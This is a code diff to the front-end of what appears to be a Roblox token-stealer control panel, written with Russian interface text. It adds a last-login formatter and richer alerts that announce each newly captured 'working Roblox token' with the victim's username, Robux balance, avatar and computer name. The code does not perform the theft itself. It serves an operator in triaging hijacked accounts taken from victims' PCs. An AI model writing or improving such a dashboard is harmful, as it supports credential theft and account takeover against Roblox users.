@@ -133,6 +133,32 @@ function playNotificationSound() {
   }
 }
 
+// ── Форматирование статуса посещения аккаунта ─────────────────────────────────
+function formatAccountLoginStatus(lastLoginTs) {
+  if (!lastLoginTs) return { isNew: true, text: 'Новый аккаунт' };
+  const ts = typeof lastLoginTs === 'string' ? parseInt(lastLoginTs) : Number(lastLoginTs);
+  if (isNaN(ts) || ts <= 0) return { isNew: true, text: 'Новый аккаунт' };
+
+  const loginDate = new Date(ts);
+  const now = new Date();
+  const diffMs = now - loginDate;
+  const diffDays = Math.max(0, Math.floor(diffMs / (1000 * 60 * 60 * 24)));
+
+  const dateStr = loginDate.toLocaleDateString('ru-RU', { day: 'numeric', month: 'short' });
+  const timeStr = loginDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+  if (diffDays === 0) {
+    return { isNew: false, text: `Был вход сегодня в ${timeStr}`, dateStr };
+  } else if (diffDays === 1) {
+    return { isNew: false, text: `Был вход вчера в ${timeStr}`, dateStr };
+  } else if (diffDays < 30) {
+    return { isNew: false, text: `Был вход: ${dateStr} (${diffDays} дн. назад)`, dateStr };
+  } else {
+    const diffMonths = Math.floor(diffDays / 30);
+    return { isNew: false, text: `Был вход: ${dateStr} (~${diffMonths} мес. назад)`, dateStr };
+  }
+}
+
 // ── Визуальное уведомление о токене ───────────────────────────────────────────
 function showTokenNotification(info) {
   if (!info) return;
@@ -154,6 +180,9 @@ function showTokenNotification(info) {
   const robuxStr = robuxNum > 0 ? robuxNum.toLocaleString() + ' R$' : '0 R$';
   const computer = escapeHtml(info.computer || 'Unknown PC');
   
+  const statusInfo = formatAccountLoginStatus(info.lastLogin);
+  const badgeClass = statusInfo.isNew ? 'token-notif-badge-new' : 'token-notif-badge-old';
+
   let avatarHtml = `<div class="token-notif-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>`;
   if (info.userId) {
     avatarHtml = `<div class="token-notif-avatar"><img src="${API_BASE}/avatar-proxy/${info.userId}" onerror="this.outerHTML='<div class=\\'token-notif-avatar\\'>O</div>'"></div>`;
@@ -162,8 +191,9 @@ function showTokenNotification(info) {
   el.innerHTML = `
     <button class="token-notif-close" onclick="this.parentElement.remove()">✕</button>
     <div class="token-notif-header">
-      <span class="token-notif-dot"></span>
-      <span class="token-notif-title">Рабочий токен Roblox</span>
+      <span class="token-notif-dot ${statusInfo.isNew ? '' : 'is-old'}"></span>
+      <span class="token-notif-title">Roblox токен</span>
+      <span class="${badgeClass}">${escapeHtml(statusInfo.text)}</span>
     </div>
     <div class="token-notif-body">
       ${avatarHtml}
@@ -180,8 +210,9 @@ function showTokenNotification(info) {
   // Системное уведомление браузера
   if ("Notification" in window && Notification.permission === "granted") {
     try {
-      new Notification("Новый рабочий токен Roblox!", {
-        body: `${username} (${computer}) — Баланс: ${robuxStr}`,
+      const title = statusInfo.isNew ? `Новый аккаунт Roblox: ${username}` : `Roblox аккаунт (${statusInfo.text}): ${username}`;
+      new Notification(title, {
+        body: `Баланс: ${robuxStr} | ПК: ${computer}\nСтатус: ${statusInfo.text}`,
         icon: info.userId ? `${API_BASE}/avatar-proxy/${info.userId}` : undefined
       });
     } catch (e) {}
@@ -209,7 +240,6 @@ async function checkNewTokensBackground() {
     if (!Array.isArray(tokens)) return;
 
     if (isFirstTokenLoad) {
-      // При первой загрузке запоминаем уже имеющиеся токены
       tokens.forEach(t => {
         const id = t.file || t.userId || t.security;
         if (id) lastKnownTokenIds.add(id);
@@ -218,17 +248,22 @@ async function checkNewTokensBackground() {
       return;
     }
 
-    // Ищем новые токены, которых не было
     tokens.forEach(t => {
       const id = t.file || t.userId || t.security;
       if (id && !lastKnownTokenIds.has(id)) {
         lastKnownTokenIds.add(id);
         if (t.valid) {
+          const lastLogin = t.lastLogin 
+            || (t.file ? localStorage.getItem('login_' + t.file) : null)
+            || (t.userId ? localStorage.getItem('login_user_' + t.userId) : null)
+            || (t.username ? localStorage.getItem('login_user_' + t.username.toLowerCase()) : null);
+
           showTokenNotification({
             username: t.username || t.user,
             userId: t.userId,
             robux: t.robux,
-            computer: t.computer
+            computer: t.computer,
+            lastLogin: lastLogin
           });
         }
       }
